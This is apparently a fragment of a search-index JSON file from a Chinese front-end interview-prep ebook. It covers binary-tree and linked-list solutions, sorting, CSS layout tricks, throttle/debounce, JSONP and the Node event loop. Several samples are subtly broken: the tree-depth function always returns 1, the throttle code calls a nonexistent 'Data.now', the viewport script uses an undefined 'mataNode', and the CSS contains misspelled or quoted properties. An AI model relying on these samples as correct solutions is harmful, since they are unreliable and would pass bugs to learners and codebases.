\u4e8c\u53c9\u6811\u7684\u4e2d\u5e8f\u904d\u5386","text":"<pre><code>/**\n * @param {TreeNode} root\n * @return {number[]}\n * \u4e2d\u5e8f\u904d\u5386\uff1a\u5de6\u6839\u53f3\n */\nvar inorderTraversal = function(root) {\n  if (!root || !root.val) {\n    return [];\n  }\n  var list = [];\n  runNode(root, list);\n  return list;\n};\n\nfunction runNode(node, list) {\n  if (node.left) {\n    runNode(node.left, list)\n  }\n  list.push(node.val);\n  if (node.right) {\n    runNode(node.right, list)\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#100","title":"100 \u76f8\u540c\u7684\u6811","text":"<pre><code>var isSameTree = function(p, q) {\n  if (p == null &amp;&amp; q == null) {\n    return true;\n  } else if (p == null || q == null) {\n    return false;\n  } else if (p.val !== q.val) {\n    return false;\n  } else {\n    return isSameTree(p.left, q.left) &amp;&amp; isSameTree(p.right, q.right);\n  }\n};\n</code></pre> <p>\u5224\u65ad\u8282\u70b9\u7684\u503c\u662f\u5426\u76f8\u7b49\uff1b\u9012\u5f52\u5224\u65ad\u5b50\u8282\u70b9\u662f\u5426\u76f8\u7b49</p>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#104","title":"104 \u4e8c\u53c9\u6811\u7684\u6700\u5927\u6df1\u5ea6","text":"<pre><code>var treeDepth = (node) =&gt; {\n  if (!node) {\n    return 1;\n  }\n  return Math.max(treeDepth(node.left), treeDepth(node.right));\n} \n</code></pre>"},{"location":"ebook-kaikeba-frontend/04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/#141","title":"141 \u73af\u5f62\u5217\u8868","text":"<pre><code>// \u73af\u5f62\u5217\u8868\u4e0d\u80fd\u901a\u8fc7\u503c\u8bb0\u5f55\uff0c\u53ef\u80fd\u5217\u8868\u4e2d\u5b58\u5728\u91cd\u590d\u503c\n// \u4e0b\u9762\u9002\u5408\u6ca1\u6709\u91cd\u590d\u5143\u7d20\u7684\u94fe\u8868\nvar hasCycle = function(head) {\n  if (!head) {\n    return false;\n  }\n  let val = head.val;\n  head.isRun = true;\n\n  while (head &amp;&amp; head.next) {\n    head = head.next;\n    val = head.val\n    if (!head.isRun) {\n      head.isRun = true;\n    } else {\n      return true;\n    }\n  }\n  return false;\n}\n</code></pre> <p>\u5982\u4f55\u5224\u65ad\u4e00\u4e2a\u8282\u70b9\u5df2\u7ecf\u88ab\u904d\u5386\u4e86\uff1f\u80fd\u5426\u8bbe\u7f6e\u4e00\u4e2a\u5c5e\u6027\u4e3atrue\uff0c\u8fd9\u6837\u4f1a\u66f4\u6539\u539f\u59cb\u8282\u70b9\uff0c\u770b\u770b\u6709\u6ca1\u6709\u66f4\u597d\u7684\u65b9\u6cd5\u3002\u73b0\u5728\u9700\u8981\u5faa\u73af\u5217\u8868\u3002\u6700\u597d\u7684\u529e\u6cd5\u662f\u8bbe\u7f6e\u4e00\u4e2a\u5feb\u6307\u9488\uff0c\u4e00\u4e2a\u6162\u6307\u9488\uff0c\u5982\u679c\u6307\u9488\u91cd\u590d\uff0c\u90a3\u4e48\u5c31\u6709\u73af\u5f62\u7ed3\u6784\u3002</p> <p>\u4e0b\u9762\u662f\u8f83\u96be\u7684\u56de\u6eaf\u7b97\u6cd5\uff1a 51-N\u7687\u540e  8\u7687\u540e</p>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/","title":"\u9762\u8bd5\u9898","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 18112  \u9605\u8bfb37\u5206\u949f</p>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#01-1","title":"01. \u4f5c\u7528\u57df\u548c\u503c\u7c7b\u578b\u5f15\u7528\u7c7b\u578b\u7684\u4f20\u90121","text":"<ul> <li>\u53d8\u91cf\u7c7b\u578b\uff1a\u5168\u5c40\u53d8\u91cf\uff0c\u51fd\u6570\u5185\u90e8\u53d8\u91cf</li> <li>\u7b80\u5355\u7c7b\u578b\u76f4\u63a5\u590d\u5236\uff0c\u590d\u6742\u7c7b\u578b\u590d\u5236\u5f15\u7528\uff1b\u5982\u679c\u6539\u53d8\u590d\u6742\u7c7b\u578b\u5185\u5bb9\uff0c\u90a3\u4e48\u5176\u4ed6\u5730\u65b9\u4e5f\u4f1a\u6539\u53d8</li> </ul>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#02-2","title":"02. \u4f5c\u7528\u57df\u548c\u503c\u7c7b\u578b\u5f15\u7528\u7c7b\u578b\u7684\u4f20\u90122","text":"<ul> <li>\u51fd\u6570\u7684\u53c2\u6570\u5982\u679c\u662f\u5f15\u7528\u7c7b\u578b\uff0c\u6539\u53d8\u5c5e\u6027\u65f6\uff0c\u4f1a\u6539\u53d8\u539f\u6765\u7684\u5bf9\u8c61\uff1b\u5982\u679c\u8ba9\u8fd9\u4e2a\u53c2\u6570\u76f4\u63a5\u6307\u5411\u65b0\u7684\u5bf9\u8c61\uff0c\u90a3\u4e48\u65b0\u7684\u5bf9\u8c61\u548c\u539f\u6765\u7684\u5bf9\u8c61\u5c31\u4e0d\u76f8\u5173\u4e86\u3002</li> <li>\u6269\u5c55\uff1a\u8fd9\u91ccthis\u6307\u5411\u4ec0\u4e48\uff08\u8c01\u8c03\u7528\u7684\u8fd9\u4e2a\u65b9\u6cd5\uff0cthis\u5c31\u6307\u5411\u8fd9\u4e2a\u5bf9\u8c61\uff09\uff1fES6\u4e2d\u5982\u4f55\u5904\u7406This\uff08bind\uff0c\u7bad\u5934\u51fd\u6570\u53ef\u4ee5\u628athis\u4fdd\u7559\u5728\u5f53\u524d\u7c7b\u4e2d\uff0c\u800c\u4e0d\u662f\u7c7b\u7684\u5b9e\u4f8b\u4e2d\uff09</li> </ul>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#03","title":"03. \u5c01\u88c5\u51fd\u6570\u8fdb\u884c\u5b57\u7b26\u4e32\u9a7c\u5cf0\u547d\u540d\u7684\u8f6c\u6362","text":"<ul> <li>\u7ed9\u5b9a\u4e00\u4e2a\u7c7b\u540d\u4f7f\u7528\u8fde\u5b57\u7b26\u8fde\u63a5\uff0c\u7136\u540e\u8f6c\u6362\u6210\u9a7c\u5cf0\u547d\u540d\u8f93\u51fa\u3002\u8003\u70b9\u662f\u5b57\u7b26\u4e32\u7684API\u3002\u6f14\u793a\u4e2d\u4f7f\u7528\u4e00\u4e2a\u6570\u7ec4\uff0c\u5b9e\u9645\u4e0a\u5b8c\u5168\u4e0d\u5fc5\u8981\uff0c\u76f4\u63a5\u4e00\u4e2a\u5faa\u73af\u5373\u53ef\u5b9e\u73b0\u3002 <pre><code>// code \u4e0d\u597d\u7684\u7b97\u6cd5(0.093 ms)\nfunction foo(str) {\n  var arr = str.split('-');\n  for (let i = 1; i &lt; arr.length; i++) {\n     arr[i] = arr[i].charAt(0).toUpperCase() + arr[i].substr(1, arr[i].length - 1);\n  }\n  return arr.join('');\n}\n\n// code \u597d\u7684\u7b97\u6cd5(0.062 ms)\nfunction foo(str) {\n  while (str.indexOf('-') &gt; -1) {\n    let index = str.indexOf('-');\n    str = str.substr(0, index) + str.charAt(index + 1).toUpperCase() + str.substr(index + 2, str.length + 1);\n  }\n  return str;\n}\n\nconsole.time(123);\nfoo('hello-world-miki-mikohjk-fghdfty-rtyfghjk');\nconsole.timeEnd(123);\n</code></pre></li> </ul>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#04","title":"04. \u5192\u6ce1\u6392\u5e8f","text":"<p>\u5192\u6ce1\u6392\u5e8f\u6cd5\uff1b\u5feb\u901f\u6392\u5e8f\u6cd5-\u8fd9\u4e24\u4e2a\u5e94\u8be5\u719f\u7ec3\u80cc\u5199 <pre><code>// code \u5192\u6ce1\u6392\u5e8f\u6cd5\nfunction bubbleSort(arr) {\n  for (let i = 0; i &lt; arr.length; i++) {\n    for (let j = 0; j &lt; arr.length - i; j++) {\n      if (arr[j] &gt; arr[j + 1]) {\n        let temp = arr[j];\n        arr[j] = arr[j + 1];\n        arr[j + 1] = temp;\n      }\n    }\n  }\n  return arr;\n}\n</code></pre></p> <pre><code>// code \u5feb\u901f\u6392\u5e8f\u6cd5\nfunction quickSort(arr) {\n  if (arr.length &lt; 2) {\n    return arr;\n  }\n  let init = arr[0];\n  let left = [];\n  let right = [];\n  for (let i = 1; i &lt; arr.length; i++) {\n    if (arr[i] &lt; init) {\n      left.push(arr[i]);\n    } else {\n      right.push(arr[i]);\n    }\n  }\n  let res = [];\n  left = quickSort(left);\n  right = quickSort(right);\n  res.push(...left, init, ...right);\n  return res;\n}\n\nvar a = [2,1,3,4,5,2,3,4,5,5,2,4,1,2,3,4,1,0,6,8,9];\nvar b = quickSort(a);\nconsole.log(b);\n</code></pre>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#05","title":"05. \u53cd\u8f6c\u6570\u7ec4","text":"<p>\u4f7f\u7528\u6570\u7ec4\u7684\u539f\u751fAPI\u5b9e\u73b0\uff0c\u6216\u8005\u5faa\u73af\u4e00\u8f6e\u53ef\u4ee5\u5b9e\u73b0\uff1b <pre><code>// code \u53cd\u8f6c\u6570\u7ec4\nvar arr = [1,2,3,4,5];\nfunction reverseArr(arr) {\n  for (let i = 0; i &lt; arr.length / 2; i++) {\n    var temp = arr[i];\n    arr[i] = arr[arr.length - i - 1];\n    arr[arr.length - i - 1] = temp;\n  }\n  return arr;\n}\n\n// code \u597d\u7684\u7b97\u6cd5\nfunction reverse(arr) {\n  arr.reverse();\n}\n</code></pre></p>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#06","title":"06. \u53bb\u6389\u6570\u7ec4\u4e2d\u91cd\u590d\u6027\u7684\u6570\u636e","text":"<p>\u53ef\u4ee5\u4f7f\u7528ES6\uff0c\u6216\u8005\u4f7f\u7528\u5bf9\u8c61\u5b58\u50a8\uff1b \u8fd9\u91cc\u7ed9\u51fa\u7684\u7b54\u6848\u662f\u53cc\u91cd\u5faa\u73af\uff0c\u6027\u80fd\u4e0d\u597d</p> <pre><code>function deleteSame (arr) {\n  return Array.from(new Set(arr));\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#07-1","title":"07. \u5b9e\u73b01\u7269\u7406\u50cf\u7d20","text":"<p>\u8fd9\u4e2a\u8003\u5bdf\u79fb\u52a8\u7aefCSS\u7684\u5b9e\u73b0 \u53ef\u4ee5\u5168\u5c40\u66f4\u6539font-size\uff0c\u9700\u8981\u628a\u56fe\u6807\uff0c\u6587\u5b57\u5927\u5c0f\u4f7f\u7528 px \u914d\u7f6e\uff0c\u628aDIV\u7684\u957f\u5ea6\u548c\u5bbd\u5ea6\uff0c\u4f7f\u7528 rem \u914d\u7f6e\u3002\u8fd9\u6837\uff0c\u56fe\u6807\u6216\u8005\u6587\u5b57\u53ef\u4ee5\u5b9e\u73b01\u7269\u7406\u50cf\u7d20\u3002</p> <pre><code>&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, user-scaleable=no\"/&gt;\n</code></pre> <p><pre><code>// code \u5168\u5c40\u66f4\u6539font-size\nwindow.onload = function() {\n  var dpr = window.devicePixelRatio;\n  var scale = 1 / dpr;\n  var width = document.documentElement.clientWidth;\n  var metaNode = document.querySelector('meta[name=\"viewport\"]');\n  mataNode.setAttribute('content', 'width=device-width, initial-scale=' + scale + ', user-scaleable=no');\n  var htmlNode = document.querySelector('html');\n  htmlNode.style.fontSize = width * dpr + 'px';\n}\n\n// \u8fd9\u6837\u5728CSS\u4e2d\uff0c1px \u5bf9\u5e94\u7684\u5c31\u662f\u771f\u5b9e\u7684\u7269\u7406\u50cf\u7d20\uff0c1rem \u5df2\u7ecf\u8f6c\u6362\u6210 16 * dpr \u5c3a\u5bf8\u3002\u5bf9\u4e8eiPhone678\uff0c\u8fd9\u662f2\u3002\u5bf9\u4e8eplus \u8fd9\u662f3\u3002\n</code></pre> \u53ef\u4ee5\u5355\u72ec\u8bbe\u7f6e\u67d0\u4e00\u6761\u7ebf\u6bb5\u7684\u5bbd\u5ea6 \u4e3b\u8981\u662f\u79fb\u52a8\u7aefdpr\u662f2-3\uff0c\u7269\u7406\u50cf\u7d20 / CSS\u50cf\u7d20\u7684\u7ed3\u679c</p> <pre><code>/* code \u5355\u72ec\u8bbe\u7f6e\u67d0\u4e00\u6761\u7ebf\u6bb5\u7684\u5bbd\u5ea6 */ \n#box {\n  width: 200px;\n  height: 200px;\n  positon: 'relative';\n}\n\n#box:before {\n  content: '';\n  position: 'absolute';\n  left: 0;\n  bottom: 0;\n  width: 100%;\n  height: 1px;\n  background: #000;\n}\n\n@media screen and (-webkit-min-device-pixel-ratio: 2) {\n  #box:before {\n    transform: scaleY(0.5);\n  }\n}\n\n@media screen and (-webkit-min-device-pixel-ratio: 3) {\n  #box:before {\n    transform: scaleY(0.333);\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#08-flex","title":"08. flex\u5143\u7d20\u6c34\u5e73\u5782\u76f4\u5c45\u4e2d","text":"<p>\u4f20\u7edf\u65b9\u6cd5\uff1a\u4f7f\u7528position\u5b9e\u73b0\u6c34\u5e73\u5782\u76f4\u5c45\u4e2d\uff1b</p> <p>\u65b9\u6cd5\u4e00 <pre><code>.father {\n    position: relative;\n}\n.son {\n    position: absolute;\n    top: 0;\n    bottom: 0;\n    left: 0;\n    right: 0;\n    margin: auto;\n}\n</code></pre> \u65b9\u6cd5\u4e8c <pre><code>.father {\n    position: relative;\n}\n.son {\n    width: 100px;\n    height: 100px;\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    margin-left: -50px;\n    margin-top: -50px;\n}\n</code></pre> \u65b9\u6cd5\u4e09 <pre><code>.father {\n    position: relative;\n}\n.son {\n    position: absolute;\n    top: 50%;\n    left: 50%;\n    transform: translate(-50%, -50%);\n}\n</code></pre></p> <p>flex \u65b9\u6cd5\u4e5f\u53ef\u4ee5\u5b9e\u73b0</p> <pre><code>.father {\n    display: flex;\n    align-items: center;\n    justify-content: center;\n}\n.son {\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#09-css","title":"09. css\u5b9e\u73b0\u4e09\u89d2\u5f62","text":"<p>\u539f\u7406\uff1a\u4e00\u4e2aDIV\uff0c\u5bbd\u5ea6\u662f0\uff0c\u8fb9\u6846\u5bbd\u5ea6\u5f88\u5927\uff0c\u8bbe\u7f6e\u56db\u4e2a\u8fb9\u4e0d\u540c\u7684\u989c\u8272\uff0c\u90a3\u4e48\u5c31\u662f\u56db\u4e2a\u4e09\u89d2\u5f62\u3002\u5982\u679c\u4f7f\u7528\u4e00\u4e2a\u4e09\u89d2\u5f62\uff0c\u90a3\u4e48\u8bbe\u7f6e\u53e6\u5916\u4e09\u4e2a\u8fb9\u662f\u900f\u660e\u8272\u5373\u53ef\u3002 <pre><code>#box {\n    width: 0;\n    height: 0;\n    border: 100px solid;\n    border-top-color: red;\n    border-bottom-color: transparent;\n    border-left-color: transparent;\n    border-right-color: transparent;\n}\n</code></pre></p>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#10-rem","title":"10. rem\u9002\u914d","text":"<p>\u8bbe\u7f6e meta \u6807\u7b7e\uff0c\u8bbe\u7f6e\u521d\u59cb\u503c\u662f initial = 1\u3002\u7136\u540e\u901a\u8fc7 JS \u83b7\u53d6\u8fd9\u4e2a\u8282\u70b9\uff0c\u83b7\u53d6\u5c4f\u5e55\u7684\u5bbd\u5ea6\uff0c\u7136\u540e\u8bbe\u7f6e\u5f53\u524d\u6839\u8282\u70b9\u7684\u7f29\u653e\u6bd4\u662f 1 / \u5c4f\u5e55\u7684\u5bbd\u5ea6\u3002\u90a3\u4e48\u8bbe\u7f6e\u67d0\u4e2a\u5143\u7d20\u7684\u5bbd\u5ea6\u662f  1rem \u5c31\u662f\u5c4f\u5e55\u7684\u5bbd\u5ea6</p> <pre><code>&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, user-scaleable=no\"/&gt;\n</code></pre> <pre><code>// code \u5168\u5c40\u66f4\u6539font-size\nwindow.onload = function() {\n  var dpr = window.devicePixelRatio;\n  var scale = 1 / dpr;\n  var width = document.documentElement.clientWidth;\n  var metaNode = document.querySelector('meta[name=\"viewport\"]');\n  mataNode.setAttribute('content', 'width=device-width, initial-scale=' + scale + ', user-scaleable=no');\n  var htmlNode = document.querySelector('html');\n  htmlNode.style.fontSize = width * dpr + 'px';\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#11","title":"11. \u80cc\u666f\u56fe\u7247\u8ddd\u79bb","text":"<p>\u95ee\u9898\uff1a\u7ed9\u5b9a\u4e00\u4e2aCSS\uff0c\u8ba1\u7b97\u80cc\u666f\u56fe\u7247\u8ddd\u79bb\u5de6\u4fa7\u8fb9\u6846\u7684\u4f4d\u7f6e\u3002</p> <p>\u9ed8\u8ba4\u7684\u80cc\u666f\u56fe\u7247\u8ddd\u79bb\u5de6\u4fa7\u8fb9\u6846\u662f0\uff0cpadding \u4e0d\u8003\u8651\u3002\u4e0b\u9762\u60c5\u51b5\u7279\u6b8a\u3002</p> <pre><code>.box {\n    width: 100px;\n    height: 200px;\n    padding: 100px;\n    border: 80px solid black;\n    background-image: url('...png');\n    background-repeat: no-repeat;\n    background-origin: content-box; /* \u8fd9\u91cc\u8bbe\u7f6e\u4e86\u8d77\u59cb\u70b9\u662f\u5185\u5bb9\u90e8\u5206 */\n    background-position: -50px 0;\n}\n</code></pre> <p>\u7ed3\u679c\u662f\uff1a\u8fb9\u6846 + \u5de6\u4fa7 padding - \u504f\u79fb\u91cf = 80 + 100 - 50 = 130px</p>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#12-js","title":"12. js\u7efc\u5408\u9762\u8bd5\u9898","text":"<p>\u53d8\u91cf\u63d0\u5347\uff0c\u51fd\u6570\u6267\u884c\u987a\u5e8f\uff0c\u5f02\u6b65\u8fc7\u7a0b\u7b49</p> <pre><code>function Foo() {\n  getName = function() {\n    alert(1);\n  }\n  return this;\n}\nFoo.getName = function() {\n  alert(2);\n}\nFoo.prototype.getName = function() {\n  alert(3);\n}\nvar getName = function () {\n  alert(4);\n}\nfunction getName() {\n  alert(5);\n}\n\n// \u6267\u884c\u4e0b\u9762\u7684\u64cd\u4f5c\nFoo.getName(); // 2\ngetName(); // 4 \u8fd9\u91cc\u4e3a\u4ec0\u4e48\uff1f\nFoo().getName(); // 1\ngetName(); // 1\nnew Foo.getName(); // 2 new (Foo.getName)(); ?\nnew Foo().getName(); // 3 (new Foo()).getName?\nnew new Foo().getName(); // new ((new Foo()).getName)(); //3?\n</code></pre> <p>new \u4e00\u4e2a\u6784\u9020\u51fd\u6570\u6216\u8005\u7c7b\uff0c\u5148\u6267\u884c\u4e00\u6b21\u8fd9\u4e2a\u51fd\u6570\uff0c\u7136\u540e\u8fd4\u56de\u8fd9\u4e2a\u7c7b\u7684\u5b9e\u4f8b\uff08\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\u6ca1\u6709\u4fdd\u5b58\u6216\u8005\u4f7f\u7528\u65b0\u5efa\u7684\u5b9e\u4f8b\uff09</p>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#13","title":"13. \u51fd\u6570\u8282\u6d41\u548c\u9632\u6296","text":"<p>\u51fd\u6570\u8282\u6d41\uff1a\u51fd\u6570\u9891\u7e41\u89e6\u53d1\u65f6\uff0c\u6bcf\u4e2a\u4e00\u5b9a\u5468\u671f\u6267\u884c\u4e00\u6b21\uff08\u6267\u884c\u591a\u6b21\uff09\u3002</p> <p>\u51fd\u6570\u9632\u6296\uff1a\u51fd\u6570\u9891\u7e41\u89e6\u53d1\u65f6\u4e0d\u6267\u884c\uff0c\u9700\u8981\u7b49\u6700\u540e\u4e00\u6b21\u89e6\u53d1\u7ed3\u675f\u540e\uff0c\u518d\u6267\u884c\u51fd\u6570\uff08\u6267\u884c\u4e00\u6b21\uff09\u3002</p> <pre><code>function throttle(fn, delay) {\n  var lastTime = 0; // \u4e0a\u6b21\u89e6\u53d1\u51fd\u6570\u7684\u65f6\u95f4\n  var nowTime = Data.now(); \n  if (nowTime - lastTime &gt; delay) {\n    fn();\n    lastTime = nowTime;\n  }\n}\n// \u5904\u7406this\u6307\u5411\u95ee\u9898\nfunction throttle(fn, delay) {\n  var lastTime = 0; // \u4e0a\u6b21\u89e6\u53d1\u51fd\u6570\u7684\u65f6\u95f4\n  return function () {\n    var nowTime = Data.now(); \n    if (nowTime - lastTime &gt; delay) {\n      fn.call(this);\n      lastTime = nowTime;\n    }\n  }\n}\n\nfunction debounce(fn, delay) {\n  var timer = null;\n  return function () {\n    clearTimeout(timer);\n    timer = setTimeout(() =&gt; {\n      fn();\n    }, delay);\n  }\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#14","title":"14. \u8de8\u57df","text":"<p>\u540c\u6e90\u7b56\u7565\uff1a\u6d4f\u89c8\u5668\u53d1\u51fa\u8bf7\u6c42\uff0c\u9700\u8981\u540c\u6e90\uff08\u534f\u8bae\u3001\u57df\u540d\u3001\u7aef\u53e3\u53f7\u76f8\u540c\uff09\uff0c\u5982\u679c\u8fdd\u53cd\u540c\u6e90\u534f\u8bae\u4f1a\u4ea7\u751f\u8de8\u57df\u3002</p> <p>\u89e3\u51b3\u65b9\u6cd5\uff1ajsonp cors \u670d\u52a1\u5668\u4ee3\u7406 \uff08JSONP\u9700\u8981\u524d\u540e\u7aef\u534f\u540c\uff0c\u5176\u4ed6\u90fd\u662f\u540e\u7aef\u7684\u65b9\u6cd5\uff09</p> <pre><code>var script = document.createElement('script');\nfunction getData(data) {\n    console.log(data);\n}\nscript.src = 'http://localhost:3000?callback=getData';\ndocument.body.appendChild(script);\n</code></pre>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#15-nodejs","title":"15. nodejs\u4e8b\u4ef6\u8f6e\u8be2\u673a\u5236","text":"<p>setTimeout setInterval process.nextTick \u4e09\u4e2a\u65b9\u6cd5</p> <p>\u6267\u884c\u6b21\u5e8f\u662f\uff1aprocess.nextTick setTimeout setImmediate</p> <p>nodeJS \u7684\u4e8b\u4ef6\u8f6e\u8bad\u673a\u5236\u662f libuv \u5b9e\u73b0\u7684\uff08C\uff09\u5206\u6210\u51e0\u4e2a\u9636\u6bb5\uff08\u4e86\u89e3\uff09</p> <ul> <li>timers \u5b9a\u65f6\u5668\u9636\u6bb5\uff1a\u8ba1\u65f6\u5e76\u6267\u884c\u5230\u70b9\u7684\u5b9a\u65f6\u5668\u56de\u8c03\u51fd\u6570</li> <li>pending callbacks TCP\u64cd\u4f5c\u9519\u8bef\u56de\u8c03\u51fd\u6570</li> <li>idle prepare \u51c6\u5907\u5de5\u4f5c</li> <li>poll \u8f6e\u8be2\u9636\u6bb5\uff08\u8f6e\u8be2\u961f\u5217\uff09\u5982\u679c\u961f\u5217\u4e0d\u662f\u7a7a\uff0c\u90a3\u4e48\u53bb\u9664\u7b2c\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u6267\u884c\uff0c\u76f4\u5230\u6267\u884c\u5b8c\u6bd5\uff1b\u5982\u679c\u8bbe\u7f6e\u8fc7setImmediate \u51fd\u6570\uff0c\u90a3\u4e48\u8fdb\u5165\u4e0b\u4e00\u4e2acheck\u9636\u6bb5\u3002</li> <li>Check \u68c0\u67e5\u9636\u6bb5\uff1a\u6267\u884c setImmediate \u8bbe\u7f6e\u7684\u56de\u8c03\u51fd\u6570</li> <li>close callbacks \u5173\u95ed\u9636\u6bb5\uff1a\u6267\u884cclose\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570</li> </ul>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#16-url","title":"16. \u4eceurl\u8f93\u5165\u7f51\u5740","text":"<p>\u8fd9\u4e2a\u9898\u76ee\u8003\u5bdf\uff1a\u7f51\u7edc\u77e5\u8bc6+\u754c\u9762\u89e3\u6790\u8fc7\u7a0b\uff0c\u4e0b\u9762\u662f\u5177\u4f53\u8fc7\u7a0b</p> <ul> <li> <p>\u57df\u540d\u89e3\u6790\uff08DNS\u89e3\u6790\uff09\uff1a\u628a\u57df\u540d\u89e3\u6790\u6210IP\uff1a\u8fd9\u4e2a\u4f9d\u6b21\u4ece\u7f13\u5b58\u4e2d\u83b7\u53d6IP\uff1b\u5982\u679c\u4e00\u76f4\u9012\u5f52\u4e0d\u5230\uff0c\u90a3\u4e48\u5c31\u4f1a\u62a5\u9519\u3002</p> </li> <li> <p>TCP\u4e09\u6b21\u63e1\u624b</p> <ul> <li>1\u3001\u6d4f\u89c8\u5668\u544a\u8bc9\u670d\u52a1\u5668\uff1a\u6211\u5c06\u8981\u53d1\u9001\u8bf7\u6c42\u4e86\uff0c\u4f60\u662f\u5426\u65b9\u4fbf</li> <li>2\u3001\u670d\u52a1\u5668\u544a\u8bc9\u6d4f\u89c8\u5668\uff1a\u6211\u51c6\u5907\u597d\u4e86</li> <li>3\u3001\u6d4f\u89c8\u5668\u544a\u8bc9\u670d\u52a1\u5668\uff1a\u6211\u51c6\u5907\u53d1\u9001\u4e86\uff0c\u4f60\u63a5\u53d7\u5427</li> </ul> </li> <li> <p>\u53d1\u51fa\u8bf7\u6c42\uff1a\u8bf7\u6c42\u62a5\u6587\uff08HTTP\uff09</p> </li> <li> <p>\u63a5\u6536\u54cd\u5e94\uff1a\u54cd\u5e94\u62a5\u6587</p> </li> <li> <p>\u6e32\u67d3\u754c\u9762</p> <ul> <li>HTML\u4e0b\u8f7d\u5b8c\u6bd5\uff0c\u4f7f\u7528HTML\u89e3\u6790\u5668\u6784\u5efaDOM\u6811</li> <li>style/link \u6807\u8bb0\uff0c\u4e0b\u8f7d\u89e3\u6790\u6837\u5f0f\u8868\uff0c\u521b\u5efa CSSOM\u6811</li> <li>\u9047\u5230 script \u6807\u7b7e\uff0c\u4f7f\u7528JS\u8ba1\u606f\u671f\uff0c\u5904\u7406JS\u4ee3\u7801\uff0c\u66f4\u6539DOM\u6216\u8005CSSOM\u6811</li> <li>\u5c06DOM\u6811\u548cCSSOM\u6811\u5408\u6210 render tree</li> <li>\u8ba1\u7b97\u9875\u9762\u5e03\u5c40\uff0c\u8ba1\u7b97\u8282\u70b9\u7684\u4f4d\u7f6e</li> <li>\u8ba1\u7b97\u8282\u70b9\u7684\u989c\u8272\uff0c\u7136\u540e\u6e32\u67d3\u5230\u5c4f\u5e55\u4e0a\uff08\u56de\u6d41\uff0c\u91cd\u7ed8\uff09\u53ef\u80fd\u540e\u51e0\u4e2a\u6b65\u9aa4\u591a\u6b21\u6267\u884c</li> </ul> </li> <li> <p>TCP\u56db\u6b21\u6325\u624b</p> <ul> <li>\u6d4f\u89c8\u5668\u53d1\u7ed9\u670d\u52a1\u5668\uff1a\u6211\u8bf7\u6c42\u62a5\u6587\u53d1\u5b8c\u4e86\uff0c\u4f60\u51c6\u5907\u5173\u95ed</li> <li>\u670d\u52a1\u5668\u53d1\u7ed9\u6d4f\u89c8\u5668\uff1a\u8bf7\u6c42\u62a5\u6587\u63a5\u53d7\u5b8c\u4e86\uff0c\u6211\u51c6\u5907\u5173\u95ed</li> <li>\u6d4f\u89c8\u5668\u53d1\u7ed9\u670d\u52a1\u5668\uff1a\u54cd\u5e94\u62a5\u6587\u6cd5\u6587\u4e86\uff0c\u4f60\u51c6\u5907\u5173\u95ed</li> <li>\u670d\u52a1\u5668\u53d1\u7ed9\u6d4f\u89c8\u5668\uff1a\u54cd\u5e94\u62a5\u6587\u63a5\u53d7\u665a\u4e86\uff0c\u4f60\u51c6\u5907\u5173\u95ed </li> </ul> </li> </ul>"},{"location":"ebook-kaikeba-frontend/05%20%E9%9D%A2%E8%AF%95%E9%A2%98/#17","title":"17. \u95ed\u5305","text":"<p>\u95ed\u5305\uff1a\u95ed\u5305\u662f\u4e00\u4e2a\u5bc6\u95ed\u7684\u5bb9\u5668\uff0c\u7528\u6765\u5b58\u50a8\u4e34\u65f6\u6570\u636e\u2014\u2014closure</p> <p>\u95ed\u5305\u5f62\u6210\u7684\u6761\u4ef6\uff1a\u51fd\u6570\u5d4c\u5957\uff1b\u5185\u90e8\u51fd\u6570\u5f15\u7528\u5916\u90e8\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\u3002</p> <pre><code>function fn() {\n    var count = 1;\n    function fnInner() {\n        console.log(count);\n    }\n}\n// \u8fd9\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u95ed\u5305\uff08\u6ca1\u6709\u5b9e\u9645\u4f5c\u7528\u7684\u95ed\u5305\uff09\n</code></pre> 